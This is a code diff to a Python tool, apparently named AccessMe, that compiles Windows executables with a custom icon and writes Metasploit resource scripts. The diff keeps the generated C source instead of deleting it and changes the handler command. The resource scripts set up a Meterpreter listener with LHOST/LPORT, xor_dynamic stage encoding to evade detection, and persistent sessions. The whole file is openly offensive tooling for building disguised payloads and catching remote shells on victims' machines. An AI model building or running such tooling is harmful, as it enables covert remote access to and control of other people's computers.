@@ -227,8 +227,8 @@ def Auto_Compiler(FILENAME, ARCH, PLATFORM, ICON):
                     EXE = ['i686-w64-mingw32-gcc', 'source.c', '/root/AccessMe/icon/AccessMe.res', '-o', FILENAME,'-mwindows']
                     subprocess.run(EXE, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
 
-                    RM_SourceFile = ['rm', '/root/AccessMe/source.c']
-                    subprocess.run(RM_SourceFile, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
+                    #RM_SourceFile = ['rm', '/root/AccessMe/source.c']
+                    #subprocess.run(RM_SourceFile, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
 
                     RM_RcFile = ['rm', '/root/AccessMe/icon/AccessMe.rc']
                     subprocess.run(RM_RcFile, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
@@ -371,7 +371,7 @@ def Run_Meterpreter_Script(ARCH, PLATFORM, RC_PAYLOAD, LHOST, LPORT, TYPE):
                         RC_Meterpreter += "set EnableStageEncoding true\n"
                         RC_Meterpreter += "set StageEncoder x64/xor_dynamic\n"
                         RC_Meterpreter += "set ExitOnSession false\n"
-                        RC_Meterpreter += "exploit -j -z"
+                        RC_Meterpreter += "exploit -z"
 
                         with open('/root/AccessMe/AccessMe_To_Msf.rc', 'w') as f:
                             f.write(RC_Meterpreter)
@@ -402,7 +402,7 @@ def Run_Meterpreter_Script(ARCH, PLATFORM, RC_PAYLOAD, LHOST, LPORT, TYPE):
                         RC_Meterpreter += "set lhost " + LHOST + "\n"
                         RC_Meterpreter += "set lport " + LPORT + "\n"
                         RC_Meterpreter += "set ExitOnSession false\n"
-                        RC_Meterpreter += "exploit -j -z"
+                        RC_Meterpreter += "exploit -z"
 
                         with open('/root/AccessMe/AccessMe_To_Msf.rc', 'w') as f:
                             f.write(RC_Meterpreter)
